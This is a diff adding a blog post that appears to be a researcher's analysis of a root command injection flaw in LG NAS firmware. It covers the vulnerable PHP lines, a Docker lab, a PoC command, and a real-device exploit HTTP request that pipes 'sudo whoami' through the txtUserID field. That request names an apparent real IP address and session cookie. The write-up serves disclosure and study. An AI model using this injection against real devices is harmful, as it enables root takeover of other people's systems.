@@ -1,0 +1,166 @@
+---
+title: "CNVD-2026-20654: LG NAS Remote Command Injection Analysis"
+description: "Analysis of LG NAS command injection CNVD-2026-20654: root cause, local setup, real-device reproduction, and affected firmware versions."
+date: 2026-07-29T00:00:00.000Z
+tags:
+  - "CNVD"
+  - "Command Injection"
+  - "LG NAS"
+  - "Vulnerability Reproduction"
+  - "Security Research"
+authors:
+  - "bx"
+draft: false
+slug: "cnvd-2026-20654-lg-nas-rce-en"
+lang: "en"
+translationKey: "cnvd-2026-20654-lg-nas-rce"
+---
+
+import Gist from '../../components/Gist.astro';
+
+
+# CNVD-2026-20654: LG NAS Remote Command Injection Vulnerability
+
+## Vulnerability Details
+
+- **Vulnerability ID**: CNVD-2026-20654
+- **Vulnerability type**: OS command injection (CWE-78)
+- **Severity**: High
+- **Attack vector**: Network (remote)
+- **Privileges required**: Low (a valid account is required)
+- **User interaction**: None
+- **Impact**: Full system control with root privileges
+
+### Vulnerable Code Locations
+
+**Line 28** (`share_set_user_info.php`):
+
+```php
+$userpasswd = trim(shell_exec("sudo nas-common md5$userpasswd"));
+```
+
+![Vulnerable code, line 28](/blog/cnvd-lg-2026-20654/01-vulnerable-code-line28.png)
+
+**Line 78** (`share_set_user_info.php`):
+
+```php
+$check = trim(exec("sudo nas-share check_user$userID"));
+```
+
+![Vulnerable code, line 78](/blog/cnvd-lg-2026-20654/02-vulnerable-code-line78.png)
+
+### Cause
+
+The cause is straightforward:
+
+1. User input is concatenated directly into a shell command.
+2. Special characters are not filtered or escaped.
+3. The command is run with sudo, gaining root privileges.
+4. shell_exec() and exec() directly execute system commands.
+
+### Complete Code
+
+<Gist locale="en" id="5672adaff13bc2bbae43f025faaebda2" />
+
+## Local Reproduction and Finding Firmware
+
+> Version 2569 is used here.
+
+To find the firmware, locate the firmware_2569_web.zip version here:
+
+[https://www.lg.com/us/support/product/lg-N2R1DD1](https://www.lg.com/us/support/product/lg-N2R1DD1)
+
+![Firmware download page](/blog/cnvd-lg-2026-20654/03-firmware-download-page.png)
+
+### Setting Up a Local Environment
+
+A similar environment has been set up:
+
+[https://github.com/bx33661/CNVD-2026-20654-lg-nas-command-injection](https://github.com/bx33661/CNVD-2026-20654-lg-nas-command-injection)
+
+Simple commands:
+
+```bash
+# 克隆仓库
+git clone https://github.com/bx33661/CNVD-2026-20654-lg-nas-command-injection.git
+cd CNVD-2026-20654-lg-nas-command-injection
+
+# 启动漏洞环境
+cd environment
+docker compose up -d
+
+# 运行 PoC（自动登录 + 命令执行）
+cd ..
+python3 poc.py \
+  --target http://127.0.0.1:8000 \
+  --username admin \
+  --password admin \
+  --injection-point userid \
+  --proof-file /var/www/en/bx.txt
+```
+
+### Local Test Results
+
+The environment after setup:
+
+![Local environment setup](/blog/cnvd-lg-2026-20654/04-local-environment-setup.png)
+
+Log in with admin/admin:
+
+![Login screen](/blog/cnvd-lg-2026-20654/05-nas-login-dashboard.png)
+
+Result of running the POC
+![Login screen](/blog/cnvd-lg-2026-20654/06-poc-execution-result.png)
+
+## Testing on a Real Device
+
+The following reproduces the issue on a real device. Prerequisite: you are already logged into the administration backend and have obtained a valid `PHPSESSID`.
+
+```http
+POST /en/php/share_set_user_info.php HTTP/1.1
+Host: xxxx:9090
+Content-Length: 35
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept: */*
+Origin: http://91.171.64.154:9090
+Referer: http://91.171.64.154:9090/fr/system/system.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: lgnas_language=fr; lgnas_web_menu=1; PHPSESSID=jhhc3np2bbgc8rmb3j1jrbgn66
+Connection: close
+
+txtMode=add&txtUserID=|sudo+whoami+>+../../zbx.txt
+```
+
+![Exploitation on a real device](/blog/cnvd-lg-2026-20654/07-real-device-exploit.png)
+
+### Verifying Command Execution
+
+Visit the login page:
+
+![Verification page](/blog/cnvd-lg-2026-20654/08-command-verification-page.png)
+
+Check the command execution result:
+
+![Command execution result](/blog/cnvd-lg-2026-20654/09-rce-execution-output.png)
+
+The command was successfully written and executed!
+
+## Affected Versions
+
+In addition to the corresponding remote version, we tested **five firmware versions** spanning **10 months** (2009-12 to 2010-10):
+
+| **Version** | **Release date** | **MD5** | **File write** | **Status** |
+| --- | --- | --- | --- | --- |
+| 2407 | 2009-12-29 | 3e01b8e3b915d95f72996e32ad78357e | No | Vulnerable |
+| 2450 | 2010-02-11 | 3e01b8e3b915d95f72996e32ad78357e | No | Vulnerable |
+| 2504 | Unknown | 3e01b8e3b915d95f72996e32ad78357e | No | Vulnerable |
+| 2557 | 2010-09-12 | 3e01b8e3b915d95f72996e32ad78357e | No | Vulnerable |
+| 2569 | 2010-10-28 | 3e01b8e3b915d95f72996e32ad78357e | No | Vulnerable |
+
+All tested versions contain this vulnerability, so its impact is broad.
+
+## Summary
+
+CNVD-2026-20654 is a typical command injection vulnerability: unfiltered user input is concatenated directly into a shell command, and combined with sudo privileges, an attacker can gain complete control of the device. The vulnerability affects multiple firmware versions. Affected users are advised to upgrade the firmware promptly and strengthen access controls.
